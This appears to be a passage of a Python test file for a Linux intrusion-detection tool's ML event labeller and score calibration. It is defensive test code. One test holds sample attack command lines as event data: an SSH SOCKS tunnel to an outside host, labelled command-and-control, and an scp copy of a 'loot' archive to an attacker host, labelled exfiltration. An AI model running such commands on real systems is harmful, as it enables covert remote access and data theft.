            process = "systemd-resolved"
            category = "network"
            message = "Suspicious public outbound DNS query"
            fields = {"suspicious": True}

        result = labeler.process_normal(FakeEvent(), delayed_learning_ok=True)
        assert result is None


class TestBootstrapNormalAllowlist:
    def _scanner(self):
        from core.ml.label_engine import BootstrapLogScanner
        return BootstrapLogScanner(distro_family="debian")

    def test_benign_auth_success_bootstrap_normal_exists(self):
        event = type("Evt", (), {
            "action": "ssh_login",
            "outcome": "success",
            "category": "auth",
            "process": "sshd",
            "message": "Accepted password for alice",
            "fields": {},
        })()

        assert self._scanner()._infer_normal_category(event) == "auth_normal"

    def test_ruleless_but_suspicious_event_has_no_bootstrap_normal(self):
        event = type("Evt", (), {
            "action": "exec",
            "outcome": "success",
            "category": "process",
            "process": "bash",
            "message": "suspicious public outbound command",
            "fields": {"lotl": True},
        })()

        assert self._scanner()._infer_normal_category(event) is None

    def test_security_tool_remove_has_no_bootstrap_normal(self):
        event = type("Evt", (), {
            "action": "security_tool_removed",
            "outcome": "success",
            "category": "process",
            "process": "dpkg",
            "message": "Guvenlik araci kaldirildi: auditd",
            "fields": {"package": "auditd", "pkg_action": "remove"},
        })()

        assert self._scanner()._infer_normal_category(event) is None

    def test_benign_systemd_service_maps_to_system_service(self):
        event = type("Evt", (), {
            "action": "service_heartbeat",
            "outcome": "success",
            "category": "service",
            "process": "systemd",
            "message": "systemd heartbeat ok",
            "fields": {},
        })()

        assert self._scanner()._infer_normal_category(event) == "system_service"

    def test_benign_file_read_maps_to_routine_file_access(self):
        event = type("Evt", (), {
            "action": "file_read",
            "outcome": "success",
            "category": "file",
            "process": "systemd",
            "message": "Configuration file read",
            "fields": {"path": "/etc/ssh/sshd_config"},
        })()

        assert self._scanner()._infer_normal_category(event) == "routine_file_access"

    def test_generic_benign_event_has_no_bootstrap_normal(self):
        event = type("Evt", (), {
            "action": "process_exec",
            "outcome": "success",
            "category": "process",
            "process": "cron",
            "message": "Routine scheduled execution",
            "fields": {},
        })()

        assert self._scanner()._infer_normal_category(event) is None


class TestBootstrapScannerDistroAttackCoverage:
    def _fill_required_normals(self, scanner):
        for cat in (
            "package_management", "auth_normal", "system_service",
            "normal_network", "routine_file_access", "normal_logout", "selinux_routine",
        ):
            scanner._normal_counts[cat] = scanner._threshold

    def test_suse_all_full_ignores_only_selinux_evasion(self):
        from core.ml.label_engine import BootstrapLogScanner

        scanner = BootstrapLogScanner(distro_family="suse")
        self._fill_required_normals(scanner)
        for cat in (
            "brute_force", "lolbin", "persistence", "lateral_movement",
            "privilege_esc", "first_seen", "slow_low", "webshell",
            "journald", "zypper_tamper",
        ):
            scanner._attack_counts[cat] = scanner._threshold

        assert scanner._all_full() is True

    def test_rhel_all_full_ignores_zypper_tamper(self):
        from core.ml.label_engine import BootstrapLogScanner

        scanner = BootstrapLogScanner(distro_family="rhel")
        self._fill_required_normals(scanner)
        for cat in (
            "brute_force", "lolbin", "persistence", "lateral_movement",
            "privilege_esc", "first_seen", "slow_low", "webshell",
            "journald", "selinux_evasion",
        ):
            scanner._attack_counts[cat] = scanner._threshold

        assert scanner._all_full() is True

    def test_debian_all_full_ignores_selinux_evasion_and_zypper_tamper(self):
        from core.ml.label_engine import BootstrapLogScanner

        scanner = BootstrapLogScanner(distro_family="debian")
        self._fill_required_normals(scanner)
        for cat in (
            "brute_force", "lolbin", "persistence", "lateral_movement",
            "privilege_esc", "first_seen", "slow_low", "webshell", "journald",
        ):
            scanner._attack_counts[cat] = scanner._threshold

        assert scanner._all_full() is True

    def test_debian_scan_uses_normalizer_normalize_with_mapped_sources(self, tmp_path):
        from core.ml.label_engine import BootstrapLogScanner

        auth_log = tmp_path / "auth.log"
        audit_log = tmp_path / "audit.log"
        dpkg_log = tmp_path / "dpkg.log"
        auth_log.write_text("auth-line\n", encoding="utf-8")
        audit_log.write_text("audit-line\n", encoding="utf-8")
        dpkg_log.write_text("dpkg-line\n", encoding="utf-8")

        scanner = BootstrapLogScanner(distro_family="debian")
        scanner._log_files = lambda: [auth_log, audit_log, dpkg_log]

        calls = []

        class FakeNormalizer:
            def normalize(self, raw, source):
                calls.append((raw, source))
                return type("Evt", (), {
                    "ts": time.time(),
                    "action": "ssh_login" if source == "auth_log" else "pkg_install",
                    "outcome": "success",
                    "category": "auth" if source == "auth_log" else "process",
                    "process": "sshd" if source == "auth_log" else "dpkg",
                    "message": raw,
                    "fields": {},
                })()

        class FakeRuleEngine:
            def check(self, event):
                if event.action == "pkg_install":
                    return [type("Rule", (), {"rule_id": "PKG-001", "score": 70})()]
                return []

        detection_engine = type("Detection", (), {"rule_engine": FakeRuleEngine()})()

        records = scanner.scan(detection_engine, FakeNormalizer())

        assert ("auth-line", "auth_log") in calls
        assert ("audit-line", "auditd") in calls
        assert ("dpkg-line", "dpkg") in calls
        assert any(r.label == "normal" and r.category == "auth_normal" for r in records)
        assert any(r.label == "attack" for r in records)

    def test_rhel_bootstrap_maps_selinux_and_package_rules_to_expected_categories(self):
        from core.ml.label_engine import BootstrapLogScanner

        scanner = BootstrapLogScanner(distro_family="rhel")

        selinux_evt = type("Evt", (), {"action": "selinux_disabled"})()
        rpm_evt = type("Evt", (), {"action": "rpm_tampering"})()
        tool_evt = type("Evt", (), {"action": "attack_tool_installed"})()

        assert scanner._infer_attack_category("RHEL-001", selinux_evt) == "selinux_evasion"
        assert scanner._infer_attack_category("RHEL-004", rpm_evt) == "persistence"
        assert scanner._infer_attack_category("RHEL-005", tool_evt) == "tool_install"


class TestAutoLabelRhelCategoryMapping:
    def test_rhel_auto_label_maps_selinux_disable_to_selinux_evasion(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {"action": "selinux_disabled"})()
        record = labeler.process_alert(
            {"rule_id": "RHEL-001", "score": 95.0, "entity": "root", "category": "system"},
            event=event,
        )

        assert record is not None
        assert record.category == "selinux_evasion"

    def test_rhel_auto_label_maps_attack_tool_install_to_tool_install(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {"action": "attack_tool_installed"})()
        record = labeler.process_alert(
            {"rule_id": "RHEL-005", "score": 90.0, "entity": "root", "category": "process"},
            event=event,
        )

        assert record is not None
        assert record.category == "tool_install"

    def test_unknown_rule_falls_back_to_unknown_attack_without_breaking_auto_label(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {"action": "", "outcome": "failure"})()

        known = labeler.process_alert(
            {"rule_id": "SSH-001", "score": 88.0, "entity": "alice", "category": ""},
            event=event,
        )
        unknown = labeler.process_alert(
            {"rule_id": "MISC-999", "score": 88.0, "entity": "bob", "category": ""},
            event=event,
        )
        high_score_unknown = labeler.process_alert(
            {"rule_id": "MISC-998", "score": 95.0, "entity": "dan", "category": ""},
            event=event,
        )
        none_category = labeler.process_alert(
            {"rule_id": "NOHIT-000", "score": 88.0, "entity": "carol", "category": None},
            event=event,
        )

        assert known is not None
        assert known.category == "brute_force"

        assert unknown is None

        assert high_score_unknown is not None
        assert high_score_unknown.category == "unknown_attack"

        assert none_category is None

    def test_benign_admin_context_alert_does_not_auto_label_attack(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        event = type("Evt", (), {
            "action": "process_exec",
            "outcome": "success",
            "process": "ansible-playbook",
            "category": "process",
            "message": "ansible-playbook backup.yml --extra-vars archive=/tmp/diag.tgz",
            "fields": {"cmdline": "ansible-playbook backup.yml --extra-vars archive=/tmp/diag.tgz"},
        })()

        record = labeler.process_alert(
            {"rule_id": "SEQ-058", "score": 84.0, "entity": "ops", "category": "sequence"},
            event=event,
        )

        assert record is None

    def test_high_fidelity_chain_keeps_specific_attack_mapping(self):
        from core.ml.label_engine import AutoLabeler

        labeler = AutoLabeler()
        c2_event = type("Evt", (), {"action": "process_exec", "outcome": "success", "process": "ssh", "category": "process", "message": "ssh -Nf -D 1080 -o StrictHostKeyChecking=no ops@198.51.100.10", "fields": {}})()
        exfil_event = type("Evt", (), {"action": "process_exec", "outcome": "success", "process": "scp", "category": "process", "message": "scp /tmp/loot.tgz attacker@198.51.100.50:/tmp/loot.tgz", "fields": {}})()

        c2_record = labeler.process_alert(
            {"rule_id": "SEQ-062", "score": 95.0, "entity": "web01", "category": "sequence", "chain_id": "web-c2"},
            event=c2_event,
        )
        exfil_record = labeler.process_alert(
            {"rule_id": "SEQ-045", "score": 91.0, "entity": "host01", "category": "sequence", "chain_id": "exfil-chain"},
            event=exfil_event,
        )

        assert c2_record is not None
        assert c2_record.category == "command_and_control"
        assert exfil_record is not None
        assert exfil_record.category == "exfiltration"


class TestScoreCalibrationWithLabels:
    """
    ScoreCalibrationEngine — label calibration entegrasyonu testleri.
    Platt scaling vs isotonic seçimi, label_adjusted flag.
    """

    def test_no_label_calibration_below_threshold(self):
        """
        Etiket sayısı 10'un altında → label calibration uygulanmamalı.
        """
        import tempfile
        from core.ml.calibration import ScoreCalibrationEngine

        with tempfile.TemporaryDirectory() as tmp:
            engine = ScoreCalibrationEngine(
                config={"ml": {"warmup_samples": 5}},
                model_dir=tmp
            )
            result = engine.calibrate("isolation_forest", 75.0)
            assert result["label_adjusted"] is False

    def test_platt_applied_with_sufficient_labels(self):
        """
        10-999 etiket → Platt scaling uygulanmalı, label_adjusted=True.
        """
        import tempfile
        from core.ml.calibration import ScoreCalibrationEngine
        from core.ml.label_engine import LabelRecord

        with tempfile.TemporaryDirectory() as tmp:
            engine = ScoreCalibrationEngine(
                config={"ml": {"warmup_samples": 5}},
                model_dir=tmp
            )

            # Fake label engine — 50 etiket
            class FakeLabelEngine:
                def get_calibration_data(self):
                    data = []
                    for i in range(25):
                        data.append((float(i * 4), 1, 1.0))   # attack
                    for i in range(25):
                        data.append((float(i * 2), 0, 1.0))   # normal
                    return data

            engine.set_label_engine(FakeLabelEngine())
            engine._label_count = 50  # Manuel set

            # Fill the warmup window
            for _ in range(10):
                engine.update("isolation_forest", 50.0)

            result = engine.calibrate("isolation_forest", 75.0)
            assert result["label_adjusted"] is True, "Label calibration uygulanmalı"

    def test_platt_transitions_to_isotonic_at_1000(self):
        """
        1000 etiket eşiğinde Platt → isotonic geçişi olmalı.
        """
        import tempfile
        from core.ml.calibration import ScoreCalibrationEngine

        with tempfile.TemporaryDirectory() as tmp:
            engine = ScoreCalibrationEngine(model_dir=tmp)

            # 999 etiket → Platt
            class FakeLE999:
                def get_calibration_data(self):
                    return [(float(i), i % 2, 1.0) for i in range(999)]

            engine.set_label_engine(FakeLE999())
            assert engine._isotonic_bins is None, "999 etiket → Platt olmalı"
            assert engine._label_count == 999

            # 1000 etiket → Isotonic
            class FakeLE1000:
                def get_calibration_data(self):
                    return [(float(i), i % 2, 1.0) for i in range(1000)]

            engine.set_label_engine(FakeLE1000())
            assert engine._isotonic_bins is not None, "1000 etiket → Isotonic olmalı"

    def test_label_calibration_persists_across_reload(self):
        """
        Label calibration parametreleri save/load döngüsünden geçmeli.
        """
        import tempfile
        from core.ml.calibration import ScoreCalibrationEngine

        with tempfile.TemporaryDirectory() as tmp:
            engine = ScoreCalibrationEngine(model_dir=tmp)

            class FakeLE:
                def get_calibration_data(self):
                    return [(float(i*2), 1 if i > 25 else 0, 1.0) for i in range(50)]

            engine.set_label_engine(FakeLE())
            A_before = engine._platt_A
            B_before = engine._platt_B
            engine.save()

            # New instance — load it
            engine2 = ScoreCalibrationEngine(model_dir=tmp)
            assert abs(engine2._platt_A - A_before) < 0.001
            assert abs(engine2._platt_B - B_before) < 0.001
            assert engine2._label_count == 50

    def test_status_shows_label_method(self):
        """status() should show the label-calibration method."""
        import tempfile
        from core.ml.calibration import ScoreCalibrationEngine

        with tempfile.TemporaryDirectory() as tmp:
            engine = ScoreCalibrationEngine(model_dir=tmp)

            class FakeLE:
                def get_calibration_data(self):
                    return [(float(i), i % 2, 1.0) for i in range(50)]

            engine.set_label_engine(FakeLE())
            status = engine.status()

            assert "label_calibration" in status
            lc = status["label_calibration"]
            assert lc["label_count"] == 50
            assert "platt" in lc["method"]

    def test_isotonic_bins_monotone(self):
        """The isotonic-regression output should be monotonically increasing."""
        import tempfile
        from core.ml.calibration import ScoreCalibrationEngine

        with tempfile.TemporaryDirectory() as tmp:
            engine = ScoreCalibrationEngine(model_dir=tmp)

            # Generate 1000+ labels with a clear split: low score=normal, high score=attack
            class FakeLE1000:
                def get_calibration_data(self):
                    data = []
                    for i in range(500):
                        data.append((float(i * 0.1), 0, 1.0))      # normal
                    for i in range(500):
                        data.append((50.0 + float(i * 0.1), 1, 1.0))  # attack
                    return data

            engine.set_label_engine(FakeLE1000())
            bins = engine._isotonic_bins
            assert bins is not None and len(bins) > 1

            # Monotonicity — each bin should be less than or equal to the next one
            for i in range(len(bins) - 1):
                assert bins[i][1] <= bins[i+1][1] + 1e-9, \
                    f"Monotonluk bozulmuş: bin[{i}]={bins[i][1]} > bin[{i+1}]={bins[i+1][1]}"
